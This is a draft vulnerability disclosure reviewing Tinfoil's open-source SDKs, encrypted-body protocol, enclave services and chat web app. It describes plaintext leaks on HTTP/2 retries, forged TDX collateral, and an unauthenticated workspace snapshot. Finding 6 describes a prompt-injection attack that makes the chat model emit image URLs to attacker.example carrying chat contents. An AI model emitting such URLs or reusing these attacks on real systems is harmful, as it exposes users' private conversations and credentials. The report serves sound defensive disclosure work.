# Tinfoil open-source security review: verified findings

**Status:** draft for responsible disclosure to security@tinfoil.sh (and, for Finding 8, to the
google/go-tdx-guest maintainers). Do not publish before fixes ship.
**Dates:** round 1 on 2026-10-07 (Findings 1-5); round 2 on 2026-10-08 (Findings 6-18 and the Finding 2
addendum), against all 100 public repositories fast-forwarded to upstream HEAD on 2026-10-08.
**Scope:** public repositories under github.com/tinfoilsh, at the commits and versions stated below.
**Method:** static review plus **local** proofs of concept (loopback tests against the libraries and
services, a headless browser under the production CSP, and real Intel/AMD/Sigstore artifacts downloaded
from public endpoints). No traffic was sent to any Tinfoil production system and nothing was filed on
GitHub.

Round 2 ran 18 independent hunters (web app x4, every SDK verifier, EHBP across five languages, the CVM
image x2, the model router, sync and storage, the chat harness and tool services, local clients, iOS,
sandboxes and the keyserver). Every candidate rated Medium or above was then handed to three further
independent reviewers, each told to refute it from a different angle (code trace, PoC reproduction,
threat model). A finding is listed only if at least two of three upheld it; the verdicts are in
`verification-verdicts.json` (round 1) and `verification-verdicts-round2.json` (round 2, including the
hunters' dead ends and coverage notes). Findings 1-5 were re-checked on 2026-10-08 and are still unfixed
at upstream HEAD.

| # | Finding | Component | Severity | Verification |
|---|---|---|---|---|
| 1 | EHBP Go client resends request bodies **in plaintext** on HTTP/2 retries | `encrypted-http-body-protocol` (Go), `tinfoil-go`, and products built on them | **High** | 5/5 upheld (conf. 0.93-0.97). PoC reproduced; fix validated |
| 2 | Signed-bytes != enforced-bytes differential lets forged Intel TDX collateral pass (duplicate-key trigger, **plus a nested-object trigger that survives duplicate-key rejection**) | `tinfoil-python` 0.14.0 (latest) | **High** | 3/3 upheld (0.86-0.90); addendum confirmed by a round-2 reviewer |
| 3 | `/snapshot` bypasses the per-chat token and returns the plaintext workspace | `code-execution-environment` | **High** (reachability caveat) | 3/3 upheld (0.75-0.85) |
| 4 | EHBP Go/tinfoil-go accept forged responses via 3xx pass-through and a 303 POST->GET downgrade | `tinfoil-go` + `encrypted-http-body-protocol` (Go) | Medium (integrity) | 3/3 upheld (0.85-0.86) |
| 5 | The summarizer enclave sends requests **before** checking the TLS pin | `confidential-summarizer` v0.1.15 (pins tinfoil-go v0.11.3) | Medium | 3/3 upheld (0.8-0.9) |
| 6 | Tinfoil Chat auto-loads model-authored remote images: zero-click exfiltration of chat context by prompt injection; `?q=`/`#send=` auto-submit **did not reproduce on production** (2026-10-11) | `tinfoil-webapp` c061681 (chat.tinfoil.sh) | **High** (7.5; 5.3-5.9 if model compliance is scored) | 3/3 upheld (0.8-0.9); reproduced by 3 hunters + headless Chromium under the production CSP |
| 7 | The unauthenticated gateway catalog chooses which `tinfoilsh/*` code a `NewGateway` client trusts; signed, freshly witnessed `cvm_admin` dev-box releases qualify | `tinfoil-go` (HEAD, v0.16.1, v0.15.8), `tinfoil-proxy`, `confidential-openai-adapter` | **High** (7.5; 6.4 for an outsider) | 3/3 upheld (0.7-0.85) |
| 8 | tinfoil-go accepts **unsigned** Intel TDX collateral: go-tdx-guest enforces a case-variant `tcbinfo`/`enclaveidentity` member that Intel's signature never covers; with a fake QE, full TDX attestation bypass | `tinfoil-go` (HEAD, v0.16.1, v0.15.x), `go-tdx-guest` v0.3.1 (upstream bug), the gomobile xcframework used by Swift/iOS, every Go enclave service | **Critical impact** (CVSS 7.4 with host root scored as a precondition, 9.1 as the adversary) | 2/2 valid lenses upheld (0.85 critical, 0.9 high); the third reviewer was blocked by an API safeguard |
| 9 | The Tinfoil Chat harness auto-executes model-chosen `web_fetch`/link-preview URLs: an injected page exfiltrates the conversation through the enclave's own crawler traffic; injection screening skipped for top-500k domains | `confidential-tinfoil-harness`, `confidential-websearch`, `confidential-website-metadata-fetcher` | **High** (7.1-7.5) | 3/3 upheld (0.75-0.85); reproduced end to end on loopback |
| 10 | tinfoil-js accepts Sigstore bundles whose Rekor entry is completely unsigned (sigstore-browser <= 0.1.14) | `tinfoil-js` 1.2.2 (the web app's verifier) | Medium | 3/3 upheld (0.75-0.9) |
| 11 | tinfoil-python re-sends a one-shot-body POST as an unencrypted bodyless request after a forged 422 and accepts the forged plaintext 200 | `tinfoil-python` 0.14.0 + `tinfoil-ehbp` 0.4.0 | Medium (integrity) | 3/3 upheld (0.7-0.9) |
| 12 | confidential-sync derives attachment keys from control-plane-visible metadata + sha256(plaintext); operator can confirm/recover guessable attachments via the unauthenticated public read route | `confidential-sync` 4acbf16 | Medium | 3/3 upheld (0.7-0.9); reproduced against the real S3 encryption sidecar |
| 13 | tinfoil-python accepts a PCK CRL from any Intel-rooted CA (revocation bypass with a revoked PCK key) | `tinfoil-python` 0.14.0 | Medium | 3/3 upheld (0.7-0.85) |
| 14 | Agent-sandbox shim tunnels anonymous CONNECT to all 16 published ports | `confidential-agent-sandbox`, `cvmimage` shim | Medium (acknowledged in a config comment) | 2/3 upheld (one reviewer: Low, acknowledged) |
| 15 | Tinfoil Proxy desktop auto-installs unsigned updates on Windows/Linux | `tinfoil-proxy` desktop app | Medium / hardening | 2/3 upheld (one reviewer: Low, needs a trust-anchor compromise) |
| 16 | Artifact sandbox origin lets model-authored artifacts/previews reach any HTTPS host | `tinfoil-webapp-sandbox` 54ed549 | Medium | 3/3 upheld (0.8-0.9) |
| 17 | The iOS app auto-fetches model-authored remote images (iOS analogue of Finding 6) | `tinfoil-ios` cd5824e + Textual 0.0.11 | **High** (static trace; no iOS runtime available) | 3/3 upheld (0.8-0.85) |
| 18 | tinfoil-swift / EHBP Swift / openai-swift-fork return a peer's nonce-less non-2xx body as the completion (Swift analogue of Finding 4) | tinfoil-swift 0.8.2 and HEAD, EHBP Swift 0.3.2, openai-swift-fork 0.0.15, the iOS app | Medium (integrity) | 3/3 upheld (0.85-0.9) |

Lower-severity items that were verified but do not meet the bar on their own are listed after Finding 18.

---

## Finding 1: EHBP Go client resends request bodies in plaintext on HTTP/2 retries (High)

### Summary

The Go EHBP client encrypts the request body but leaves the request's `GetBody` pointing at the
**original plaintext body**. Go's HTTP/2 client replays a request on a new stream when the peer sends
`RST_STREAM(REFUSED_STREAM)` or `GOAWAY`, and it rebuilds the body by calling `GetBody()`. The replay
therefore carries the plaintext body, still labelled with the `Ehbp-Encapsulated-Key` header.

The party that terminates TLS can trigger this with one frame. EHBP exists precisely so that this party
cannot read bodies. It then:

1. refuses the sealed stream,
2. reads the plaintext retry,
3. forwards the original ciphertext to the real enclave, and
4. relays the sealed reply.

The client decrypts a genuine answer and reports success. Nothing is logged and no error is raised.

`tinfoil-go` uses this transport **by default** (`TransportEHBP`). Several shipped Tinfoil components send
EHBP through Tinfoil's own gateway (`inference-gateway.tinfoil.sh`), which clients never attest. Those
components are `tinfoil-proxy`, `confidential-openai-adapter`, and `confidential-tinfoil-harness`, the
enclave that runs Tinfoil Chat conversations.

### Affected versions

- **`encrypted-http-body-protocol` Go client:** reproduced on `v0.3.2` (the version every Go consumer
  pins) and on HEAD `7ee9288` (= `v0.4.0`, the latest release). Verifiers report the same code shape back
  to `v0.1.7`. **No fixed release exists.**
- **`tinfoil-go`:** HEAD `ef79d8e`, byte-identical in all relevant files to the latest published
  `v0.17.0-rc.1`. Also `v0.16.1` and earlier versions that call `NewTransportWithIdentity`.

### Root cause

`encrypted-http-body-protocol/client/client.go` (HEAD):
```go
323	newReq := req.Clone(req.Context())                 // Clone copies req.GetBody (plaintext)
343	reqCtx, err := t.serverIdentity.EncryptRequestWithContext(newReq)
363	resp, err := t.roundTripper().RoundTrip(newReq)    // http.DefaultTransport (ForceAttemptHTTP2)
```
`encrypted-http-body-protocol/identity/crypt.go` (HEAD):
```go
435	func (i *Identity) EncryptRequestWithContext(req *http.Request) (*RequestContext, error) {
458		req.Body = streamingReader     // ciphertext, used for the FIRST attempt only
459		req.ContentLength = -1
		// req.GetBody is never cleared or replaced
```
Go 1.27.1 `net/http/internal/http2/transport.go`:
```go
507	func shouldRetryRequest(req *ClientRequest, err error) (*ClientRequest, error) {
517		if req.GetBody != nil {
518			body, err := req.GetBody()     // <- the caller's plaintext body
537	func canRetryError(err error) bool {
538		if err == errClientConnUnusable || err == errClientConnGotGoAway { return true }
542			return se.Code == ErrCodeRefusedStream
```

Every common caller sets `GetBody` to plaintext:

- openai-go sets it for its JSON body.
- `http.NewRequest` sets it for `bytes`/`strings` readers.
- In `tinfoil-go`, `user_cache_secret.go:264-271` sets it deliberately, including the injected
  `user_cache_secret`.
- In `tinfoil-go`, `seal_transport.go:248-254` (`setGatewayBody`) sets it, including `cache_salt`.

The tinfoil-go wrappers assume every replay passes back through EHBP. net/http's retry runs *below* EHBP,
so that assumption does not hold.

### Triggers (tested on Go 1.27.1)

- `RST_STREAM(REFUSED_STREAM)`, even when sent as soon as `HEADERS` arrive and before any `DATA`.
- `GOAWAY` with any error code, including a graceful `NO_ERROR` on a fresh or reused connection.
- On Go ≤ 1.26, which some enclave service images use, a peer `RST_STREAM(PROTOCOL_ERROR)` also triggers it.
- **HTTP/1.1 is not a practical vector.** openai-go sends no `Idempotency-Key`, so POSTs are not replayed.
  The attacker can always choose HTTP/2 through ALPN, because Go's default transport offers `h2`.
- **Even honest infrastructure can trigger it.** An unmodified Go `net/http` HTTP/2 server with
  `MaxConcurrentStreams` set to 1 or 32 received **1140/1280** and **375/1280** plaintext bodies
  respectively during bursts of 128 requests on new connections. With the setting at 100 it received
  none. In that benign case the enclave later rejects the replay (400), but the plaintext has already
  reached the intermediary.

### Who can exploit it (precondition)

The attacker must be the client's **TLS peer**. A network attacker who cannot terminate TLS cannot
inject the triggering frames.

- **`TransportTLS` (pinned mode) is not affected.** The pin is checked in `VerifyConnection` during the
  handshake, so a non-enclave peer never receives a request.
- **EHBP mode deliberately does not pin TLS.** It uses `http.DefaultTransport` with WebPKI validation
  only (`tinfoil-go/enclave_transport.go:137-148`; `tinfoil-go/AGENTS.md`). Its documented property is
  "Only the verified enclave can decrypt them, so it works through proxies"
  (`enclave_transport.go:21-24`). EHBP confidentiality must therefore hold whoever the TLS peer is, and
  this bug breaks it.

| Configuration | Who terminates TLS | Attacker requirement |
|---|---|---|
| `NewGateway(...)`, `tinfoil-proxy`, `confidential-openai-adapter`, harness model turns | Tinfoil gateway (`inference-gateway.tinfoil.sh`). Unattested; `tinfoil-proxy` says "The gateway is not attested". | None beyond being, or compromising, the gateway. **On-path by design.** |
| `WithBaseURL(proxy)` | The configured proxy | Proxy operator. On-path by design. |
| Any mode behind enterprise TLS inspection | Middlebox with a locally trusted root | Middlebox operator |
| Default `NewClient()` direct to the router enclave | Normally the enclave | A WebPKI certificate for the hostname plus an on-path position. Possible holders: the DNS owner (Tinfoil), a host passing ACME HTTP-01/TLS-ALPN-01 for the enclave IP, a compromised DNS API token, or CA mis-issuance. Inside Tinfoil's "not even Tinfoil" model; CT would record the certificate afterwards. |

### Production exposure (verified in code; end-to-end PoCs where noted)

| Component (pinned versions) | Path | Data the gateway or intermediary can read |
|---|---|---|
| **`confidential-tinfoil-harness`**, the Tinfoil Chat backend enclave (tinfoil-go `v0.15.4-0.20260828072713-251feb041ce8`, EHBP `v0.3.2`) | `main.go:73` defaults to the gateway URL. `main.go:131-142` builds `NewClientWithOptions(WithEnclave, WithRepo, WithBaseURL(gateway+"/v1/"))`, which is default EHBP. `agent.go:289-298` sends each turn with `http.NewRequestWithContext(..., bytes.NewReader(payload))`. **End-to-end PoC** using the harness's own test harness and `/v1/threads/turn` route, built with its Dockerfile toolchain (Go 1.26.6). | Every model turn: the assembled conversation, i.e. system prompt, history, project documents, memory and attachments. Audio turns too. |
| **`tinfoil-proxy`** CLI, Electron app and container image (tinfoil-go `v0.16.1`, EHBP `v0.3.2`) | `main.go:23` sets the default gateway; `proxy.go:134` calls `tinfoil.NewGateway`. The README promises EHBP is used "so neither the gateway nor any other intermediary can read them". **End-to-end PoC** with the shipped proxy code (REFUSED_STREAM and GOAWAY variants); the local client gets a normal 200. | Every request from local tools, including `cache_salt` |
| **`confidential-openai-adapter`** (tinfoil-go `v0.15.8-0.20260924012310-ff60af7e9ea6`, EHBP `v0.3.2`) | `main.go:27,45`: `tinfoil.NewGateway`. Its reverse proxy sets a plaintext `r.GetBody`. Adapter-shaped PoC. | Customers' API request bodies |
| `tinfoil-go` SDK users | Default `NewClient`, `WithBaseURL`, `NewGateway`, and `HTTPClient()` | Prompts, files, plus `user_cache_secret` / `cache_salt` |
| Other Go enclave services on default EHBP (inspection only) | `confidential-safeguards` (forwards conversations to classifiers), `confidential-websearch`, `confidential-doc-upload` (VLM page images), the deprecated `tinfoil-cli proxy` | Service-to-enclave request bodies |

**Older variant, same root cause.** EHBP ≤ `v0.2.5` also sends the plaintext to an attacker-chosen
`Location` on a 307/308 redirect, because it uses an inner `http.Client.Do`. This was verified locally.
`confidential-sync` and `demo-safeguard` still pin it, through tinfoil-go `v0.13.x`/`v0.14.x`.

**Not affected:**
- the JS, Python, Rust and Swift EHBP clients and SDKs: Python was tested against a refusing HTTP/2 peer
  and saw no replay; the others were checked by code review;
- `TransportTLS`;
- the model router's upstream calls (TLS-pinned);
- `confidential-summarizer` (TLS-pinned, but see Finding 5);
- `verifiable-reviewer`.

**Not verified (no production traffic was sent):** whether `inference-gateway.tinfoil.sh` currently
negotiates HTTP/2, and whether it runs in a VM. A malicious or compromised gateway controls protocol
negotiation and is not attested by clients, so neither changes the conclusion.

### Proof of concept (local only)

Files are under `ehbp-h2-retry-plaintext/`. The "intermediary" is a loopback TLS server that speaks raw
HTTP/2 frames and never holds the HPKE private key.

1. **Library level, EHBP HEAD `v0.4.0` and release `v0.3.2`** (written for this report):
   ```
   cd ehbp-h2-retry-plaintext/encrypted-http-body-protocol          # or encrypted-http-body-protocol-v0.3.2
   go test ./client/ -run TestPoC_RefusedStreamReplaysPlaintextBody -v -count=1
   ```
   ```
   client: status=200 proto=HTTP/2.0 decrypted answer="enclave answer"
   intermediary observed body #0: "\x00\x00\x00tb8\xaf\xf7J..."        (ciphertext, refused)
   intermediary observed body #1: "{\"model\":\"m\",\"messages\":[{\"role\":\"user\",\"content\":\"CONFIDENTIAL: acquisition target is ACME Corp\"}]}"
   VULNERABLE: the intermediary read the plaintext request body, and the client call succeeded normally
   ```
2. **SDK level: tinfoil-go default stack plus the real openai-go client.** Only the attestation step is
   stubbed, by a function that hands over the HPKE key a successful verification would yield.
   ```
   cd ehbp-h2-retry-plaintext/tinfoil-go && go test -run 'TestPoC_' -v -count=1 .
   ```
   Both default EHBP mode and gateway mode leak the plaintext chat request, including
   `user_cache_secret` or `cache_salt`. `Chat.Completions.New` returns the genuine enclave answer.
3. **Additional verifier PoCs** are in `ehbp-h2-retry-plaintext/evidence/`:
   - GOAWAY and pre-DATA REFUSED_STREAM variants, plus the benign-server burst test;
   - the end-to-end `tinfoil-proxy` and harness tests;
   - the Go 1.26 PROTOCOL_ERROR variant and the EHBP v0.2.5 307 redirect variant;
   - the SDK streaming and multipart audio variants;
   - an HTTP/1.1 control.

### Fix (validated locally)

```go
// identity/crypt.go, EncryptRequestWithContext, after replacing the body:
req.Body = streamingReader
req.ContentLength = -1
req.GetBody = nil // transport-level retries must never re-read the caller's plaintext
```

An alternative is a `GetBody` that replays the already-produced ciphertext byte-for-byte.

What the fix was checked against:
- With the one-line change, the PoC fails closed: `http2: Transport: cannot retry err [stream error:
  ... REFUSED_STREAM; received from peer] after Request.Body was written`.
- Every variant above stops leaking.
- The full existing EHBP Go test suite passes (`go test ./... -skip TestPoC_`).

Retries above the EHBP layer still work and stay safe, because each one goes back through `RoundTrip` and
is re-encrypted. That covers openai-go's retry loop, `http.Client` redirects and tinfoil-go's
key-rotation recovery.

Also recommended:
- Add a raw-frame HTTP/2 regression test that sends REFUSED_STREAM and GOAWAY.
- Release a fixed EHBP version and bump `tinfoil-go`, `tinfoil-proxy`, the harness, the adapter and the
  other Go services.
- Move `confidential-sync` and `demo-safeguard` off EHBP ≤ v0.2.5.

### Severity

**High.**
- Gateway and proxy topologies (Tinfoil Chat harness, `tinfoil-proxy`, adapter): CVSS 3.1
  `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5**.
- Default direct-to-enclave mode, where a certificate-capable on-path adversary is needed:
  `AC:H` = **5.9**.

---

## Finding 2: tinfoil-python accepts forged Intel TDX collateral via a duplicate-key JSON differential (High)

**Component:** `tinfoil-python` **0.14.0**, the latest on PyPI; `collateral_tdx.py` is byte-identical at repo
HEAD `98911bb`. Files: `src/tinfoil/attestation/collateral_tdx.py`: `_verify_collateral_signature`
(L642-735), `parse_tcb_info_response` (L538-567) and `parse_qe_identity_response` (L570-603).

### Root cause

- `_verify_collateral_signature` verifies Intel's ECDSA signature over the **first** `"tcbInfo":` /
  `"enclaveIdentity":` object it finds in the response text (`str.find` plus `raw_decode`).
- The parsed objects that are actually enforced come from `json.loads`, where the **last** duplicate key
  wins.

An attacker can take a genuine Intel-signed PCS response and append a second `tcbInfo` or
`enclaveIdentity` member with arbitrary contents. The signature checks out against the first copy, and the
forged copy is what gets enforced. That includes TCB levels and status, QE MRSIGNER/ISVPRODID, `nextUpdate`
and the evaluation number. The forged collateral is also written to the on-disk cache, and the cache is
re-verified with the same flawed check, so the forgery persists across sessions.

### Reachability

- All collateral is fetched from `https://tdx-proxy.tinfoil.sh/...`, which is Tinfoil-operated and
  outside any enclave.
- tinfoil-python has no V3 document flow. Every TDX verification goes through `validate_collateral`,
  through this path: `TinfoilAI` / `SecureClient.verify()` / `verify_from_bundle()` → `Document.verify`
  → `verify_tdx_attestation` → `validate_collateral`.
- Whoever serves the attestation document chooses its format, so the exposure is not limited to genuine
  TDX deployments.

### Impact (shown end to end on the published wheel via the public `TinfoilAI()` API)

- **Forged TCB status.** A real Intel SPR quote with its genuine PCK chain is rejected with genuine TCB Info
  ("No matching TCB level found"). With a duplicate key appended to the same TCB Info, it is accepted as
  `UpToDate`.
- **Full attestation bypass by forging the QE identity.** QE Identity is the only Python check that ties
  a quote to Intel's TD Quoting Enclave. In DCAP, the PCE certifies any enclave that has PROVISIONKEY, and
  with Flexible Launch Control the host owner decides which enclaves get it. So a host or operator can run
  its own "QE" that signs arbitrary TD quote bodies, carrying any measurements and the attacker's
  TLS/HPKE keys. Results:
  - control (genuine collateral): rejected;
  - forged TCB Info only: rejected (MRSIGNER mismatch);
  - both forged: **`securityVerified=True`** with the attacker's keys, and the attacker decrypts the
    user's prompt;
  - gateway/bundle mode: the same, without any DNS or WebPKI tricks.

**Caveats:**
- The captured 2023 Intel collateral is expired, so the clock was frozen to 2023-06-30.
- The attacker platform's PCK chain was simulated, since a new Intel-signed PCK cannot be produced.
  Collateral chains were still verified against the real pinned Intel root.
- The custom-QE step relies on the documented DCAP/FLC property and was not exercised on hardware.
- Forging the TCB status alone would be roughly Medium.

**Fix:** reject duplicate JSON members everywhere (`object_pairs_hook`), as Tinfoil's own V3 spec and
porting guidance already require. Then verify the signature over the exact bytes that are parsed and
enforced. Go/V3 is not affected by the duplicate-key trigger (exact duplicates fail the signature there), but see Finding 8 for a different Go mechanism with the same effect.

**Evidence:** `python-tdx-collateral-dupkey/evidence/` contains the PoC scripts, the real Intel
artifacts, and the outputs of the flip, end-to-end and real-HTTPS-stack runs.

---

### Addendum to Finding 2 (tinfoil-python): a second trigger that survives duplicate-key rejection

The python-sdk hunter and a verifier confirmed a nested-object variant of the same bug:
`_verify_collateral_signature` locates the signed object with `str.find` on the **first** occurrence of
`"tcbInfo":` / `"enclaveIdentity":` and only checks that the preceding non-space character is `{` or `,`
(`collateral_tdx.py:680-689`), which a nested object's opening brace satisfies. A response of the form
`{"_": {"tcbInfo": <genuine>}, "tcbInfo": <forged>, "signature": <genuine>}` contains **no duplicate
member**, passes a strict `object_pairs_hook` parser, verifies the signature over the nested genuine copy
and enforces the forged top-level copy. Reproduced end to end through `Document.verify()` on the
published 0.14.0 wheel (`python-tdx-collateral-dupkey/evidence/nested-variant/`: A reject genuine,
B accept nested forgery, C accept from poisoned cache, D reject the dup-key forgery under a strict parser,
E accept the nested forgery under the same parser). **The fix must verify the signature over the exact
bytes that are enforced** (re-serialize and compare, or locate the member with a real top-level parse);
rejecting duplicate keys alone leaves the SDK exploitable.

---

## Finding 3: code-execution `/snapshot` bypasses the per-chat token and returns the plaintext workspace (High, with reachability caveat)

**Component:** `code-execution-environment` (HEAD `8676c64`; the same shim block appears in release
`v0.0.17`), using tfshim `v0.3.18` as pinned.

### Root cause

- `api-server/main.go:155-163` routes `/snapshot` through `checkLifecycle` only.
- Every other path goes through `g.check`, which runs `checkAuth` (main.go:79-93) on the per-chat
  `X-Code-Execution-Container-Auth-Token`. The webapp derives that token client-side with HKDF from the
  chat KEK, so Tinfoil infrastructure never sees it.
- `executor/snapshot.go:149-165` streams all of `/workspace` as a base64 tar. Its header comment reads
  "plaintext… Encryption happens upstream".
- The measured shim config (`tinfoil-config.yml:39-49`) exposes `/snapshot` without `authenticated:`.

### Impact

A single unauthenticated `POST /snapshot` to a sandbox's shim returns the full plaintext workspace:
- the restored prior-session workspace, which is stored encrypted under the user's key;
- user uploads that were copied into the workspace;
- model outputs;
- any secrets written there.

This was reproduced with unmodified production-equivalent binaries: the unmodified api-server and
executor, and the pinned tfshim, run as production uids with production capabilities.
- Every other path returns 401/403, but `/snapshot` returns 200 with the data.
- If the attacker overlaps the orchestrator's eviction snapshot, both requests succeed and the eviction
  looks normal: deterministic for large workspaces, 19 of 20 trials for small ones.

### Caveats

- The orchestrator (`confidential-code-execution`) is private, so sandbox addressing and public
  reachability are **inferred, not verified**.
- Tinfoil's host, control plane and network certainly have reach. The hop uses attested TLS precisely
  because that network is untrusted.
- Reach by other users or the internet depends on the public per-container endpoints and on hostname
  discovery. That is plausible but unverified; if it holds, this becomes Critical.
- The exemption is deliberate: the orchestrator snapshots at eviction without the token (see
  `main_test.go:208-225`). Nothing restricts the endpoint to the orchestrator.
- The webapp currently hard-disables code execution. The harness offers it per user when it is enabled.

**Fix:** require the container token on `/snapshot`, or a separate orchestrator-only credential, for
example one derived from the encryption key the orchestrator already holds at eviction. Alternatively,
encrypt the snapshot inside the container with the user's key, and stop exposing `/snapshot` through the
public shim.

**Evidence:** `cee-snapshot-auth-bypass/evidence/` contains run scripts, captured outputs and the race
test.

---

## Finding 4: EHBP Go / tinfoil-go accept forged responses (Medium, integrity)

**Components:** `tinfoil-go` (HEAD and `v0.16.1`; also the harness's pinned version);
`encrypted-http-body-protocol` Go client `v0.3.2` and `v0.4.0`; openai-go `v3.42.0` as composed by
tinfoil-go.

### Root cause

- The EHBP Go client passes through, unauthenticated, any response that has no `Ehbp-Response-Nonce` and
  a status outside 2xx. That includes 3xx (`client.go:386-391` at HEAD).
- It hands redirects to the outer `http.Client`.
- tinfoil-go's EHBP `http.Client` sets no `CheckRedirect`.
- openai-go treats every status below 400 as success (`requestconfig.go:531`).

### Two attack paths

- **(a) Unauthenticated 3xx.** The intermediary answers the sealed POST with a nonce-less 300, 301, 302,
  303, 305, 306 or 399 and a plaintext JSON or SSE body. openai-go returns it as the completion. This
  works in `NewGateway` mode too.
- **(b) 303 downgrade.** `http.Client` re-issues the request as a bodyless GET, which EHBP neither seals
  nor checks. The forged 200 is returned as the answer to the sealed POST. This works in direct mode,
  with `WithBaseURL`, and through `HTTPClient()`. The last of these is the Tinfoil Chat harness pattern:
  a forged SSE stream carrying an attacker-chosen `tool_call` was reproduced on the harness's pinned
  tinfoil-go, and the harness auto-executes model-requested tools.

### Notes

- **Integrity only:** the intermediary never sees the prompt.
- **Contradicts the spec:**
  - SPEC §5.3 says pass-through bodies are "untrusted diagnostics; callers MUST NOT act on them as
    authenticated application data".
  - SPEC §7.1 claims a MitM "cannot create valid encrypted responses".
- **Other SDKs are not affected:** tinfoil-python, tinfoil-rs and openai-node reject redirects or
  non-2xx responses.
- **Expect pushback:** EHBP v0.4.0's `conformance/SECURITY-AUDIT.md` lists status codes outside AEAD as a
  known limitation. However, it assumes deployments rely on TLS or application semantics, and tinfoil-go
  relies on neither. The 303 sealed→unsealed downgrade is not covered by that note at all.

**Fix:**
- Refuse redirects on the EHBP client (`CheckRedirect` returning `http.ErrUseLastResponse`), and never
  follow a sealed request to an unsealed one.
- Treat nonce-less non-2xx responses as errors before openai-go sees them.

**Evidence:** `ehbp-response-forgery/evidence/`.

---

## Finding 5: confidential-summarizer sends requests before checking the TLS pin (Medium)

**Component:** `confidential-summarizer` **v0.1.15** (latest; deployed as `summarizer.tinfoil.sh`). It
pins `tinfoil-go v0.11.3` and `github.com/tinfoilsh/verifier v0.11.2`. Every published tag from v0.1.0 to
v0.1.15 pins the vulnerable SDK.

### Root cause

- `verifier/client/roundtrip.go:22-44` (`TLSBoundRoundTripper.RoundTrip`) calls
  `http.DefaultTransport.RoundTrip(r)` first.
- That writes the complete request, including the `Authorization: Bearer <TINFOIL_API_KEY>` header and the
  body, to any WebPKI-valid peer.
- Only after the response arrives does it compare `resp.TLS` against the attested key.

Upstream fixed this pattern in tinfoil-go v0.13.0, where the pin is enforced before any data is sent. The
summarizer was released afterwards without picking up the fix.

### Impact

An on-path party holding a publicly trusted certificate for the router hostname receives every summarize
request. Possible holders are the host, the DNS or control-plane operator, or anyone who passes ACME
validation for the enclave IP. The requests contain:
- the first ≤100 words of the first user message of each new chat (webapp, harness);
- ≤200-word tails of model reasoning (webapp);
- iOS chat titles and thinking summaries;
- the summarizer's API key.

The attack is noisy: each intercepted call returns 503, which clients swallow silently.

**Fix:** rebuild on current tinfoil-go, which checks the pin in `VerifyConnection` before any request
bytes are sent, or use EHBP after Finding 1 is fixed. Then cut a release.

**Evidence:** `summarizer-postsend-pin/evidence/`.

---

## Finding 6: Tinfoil Chat auto-loads model-authored remote images, giving prompt injection a zero-click exfiltration channel (High)

**Component:** `tinfoil-webapp` HEAD `c061681` (2026-10-07, package version 1.0.6; deployed as chat.tinfoil.sh).
Files: `src/components/chat/renderers/components/markdown-components.tsx:446-453` (the custom `img`
component renders `<img src={src}>` unchanged), `use-math-plugins.ts:52-57` (rehype-raw 7.0.0 then
rehype-sanitize 6.0.0 with `defaultSchema`, which keeps `img[src]` for http/https and `source[srcSet]`
with no protocol check), `ThoughtProcess.tsx:368` (reasoning rendered with the same pipeline),
`chat/genui/widgets/ArtifactPreview.tsx:336` (markdown artifacts rendered with a bare `ReactMarkdown`),
`code-block.tsx:318,728` (```markdown fences auto-open a preview after streaming), `genui/widgets/Image.tsx`
(`render_image` widget), `vercel.json:48` (production CSP: `img-src 'self' data: blob: https:`).
Delivery vector: `src/components/url-hash-message-handler.tsx:117,161` (`/newchat?q=` and `/#send=<b64>`
auto-submit a prompt with no confirmation).

### Root cause

Every assistant message, reasoning block, markdown artifact and auto-opened markdown preview turns
model-authored `![](https://…)`, raw `<img>` and `<picture><source srcset>` into live image elements,
and the production Content-Security-Policy allows `img-src https:`. The browser fetches the URL the
moment the message renders, so whatever the model encodes in the query string (prior turns, attached
document text, personalization profile, project instructions) leaves the device, together with the
user's IP address. The rest of the app treats direct third-party loads as a privacy leak: favicons are
fetched through the attested metadata enclave "so the browser never reaches an external icon host
directly", and Apple Maps needs a consent dialog about IP disclosure. This channel contradicts that
threat model. The only defence against the injected instruction is a sentence in the router's system
prompt (`confidential-model-router/toolruntime/prompt.go:16`).

### Who can exploit it

| Vector | Attacker | User interaction | What leaks |
|---|---|---|---|
| Indirect prompt injection through web search (on by default per chat), a fetched page, or an attached/pasted document | Author of any web page or document the user has the assistant read. No Tinfoil position. | The user asks about the poisoned content (UI:R); the model must follow the injected instruction | The current chat: prompts, prior answers, attached document text, personalization, project instructions |
| One-click link: `https://chat.tinfoil.sh/newchat?q=<prompt>` or `/#send=<base64>` | Any web page, e-mail, chat message or QR code. The hash form never reaches a server. | One click; the prompt is then submitted and answered in the victim's account with no confirmation | A fresh chat's context: the control-plane system prompt, the `<user_preferences>` block (nickname, profession, traits, free-text "additional context"), timezone, the model's answer, the victim's IP |
| Malicious or compromised model / router output | The enclave output is rendered with full trust | None | Same as above |

The same page also works for anonymous (signed-out) visitors, who get inference through `/api/keys/chat`.

**Production check (2026-10-11, by the reporter, own browser):** opening
`https://chat.tinfoil.sh/newchat?q=hello` neither sent nor prefilled the message. The public source at
HEAD `c061681` (and `origin/main` `a8cdda0`, which does not touch the handler) auto-sends it, so the
deployed build or its runtime state differs from the repo. **Treat the `?q=` / `#send=` delivery vector
as not reproduced in production.** The image-loading channel itself (injection via web search,
fetched pages or documents) has not yet been tested in production.

### Proof of concept (local only; `webapp-image-exfil/evidence/`)

Three independent hunters and three verifiers reproduced it on unmodified shipped code (the only
additions are files under `tests/poc/`):

1. `tests/poc/markdown-image-exfil.test.tsx` and `dump-rendered-message.test.tsx` (vitest, real plugin
   pipeline): the renderer emits `<img src="https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV…">`
   for the markdown, raw-HTML and `<picture>` forms, for markdown artifacts and for the auto-opened
   ```markdown preview; a `StreamingChunkedText` test shows the element exists at first paint, after the
   async plugins load, and mid-stream.
2. `browser-poc/run.mjs` (headless Chromium, Playwright): the rendered message is served from a loopback
   HTTPS origin **with the exact `vercel.json` CSP header**. The loopback attacker server logs
   `/exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV…`
   twice (markdown and raw `<img>`), while the negative controls (iframe, inline script, external
   stylesheet, a `fetch()` to the attacker origin) are blocked by the same policy. The CSP is enforced;
   images are the one open channel. A sibling hunter's run also delivered the GenUI `render_image` form.
3. `tests/poc/cross-site-prompt-submit.test.tsx` plus a verifier test that wires the URL handler to the
   real, unmodified `useMessageQueue`: `/newchat?q=…` and `/#send=…` reach `handleQuery` with no DOM
   user event, for signed-in and signed-out sessions.

